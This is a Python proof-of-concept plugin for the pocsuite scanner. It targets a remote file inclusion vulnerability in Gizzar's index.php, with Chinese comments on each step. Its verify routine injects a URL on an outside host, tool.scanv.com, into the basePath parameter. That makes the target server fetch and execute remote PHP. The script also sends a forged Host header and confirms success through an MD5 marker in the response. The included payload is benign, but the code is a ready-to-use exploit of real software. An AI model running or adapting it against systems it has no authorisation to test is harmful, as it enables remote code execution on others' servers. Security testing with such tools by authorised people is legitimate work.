#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '64305'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2006-12-13'
    createDate = '2015-12-19'
    updateDate = '2015-12-19'
    references = ['http://www.sebug.net/vuldb/ssvid-64305']
    name = 'Gizzar &lt;= 03162002 (index.php) Remote File Include Vulnerability'
    appPowerLink = 'N/A'
    appName = 'Gizzar'
    appVersion = '03162002'
    vulType = 'Remote File Include'
    desc = '''
		Gizzar 03162002及早期版本的index.php脚本存在PHP远程文件包含漏洞，
		远程攻击者可以借助basePath参数中的URL执行任意PHP代码。
    '''
    samples = ['']

    def _attack(self):
        result = {}
        return self.parse_output(result)

    def _verify(self):
		#利用index.php文件验证RFI漏洞
        result = {}
		#<?php echo md5('3.1416');?>
        payload='http://tool.scanv.com/wsl/php_verify.txt?'
		#测试用的payload
        vulurl='{url}/index.php?basePath={evil}'.format(url=self.url,evil=payload)
		#伪造的HTTP头
        httphead = {
          'Host':'www.google.com',
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
		#发送测试请求
        resp=req.get(vulurl,headers=httphead,timeout=50)
		#md5('3.1416')=d4d7a6b8b3ed8ed86db2ef2cd728d8ec
        match = re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', resp.content)
		#如果成功匹配到md5('3.1416'),证明漏洞验证成功
        if match:
			#返回测试信息
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)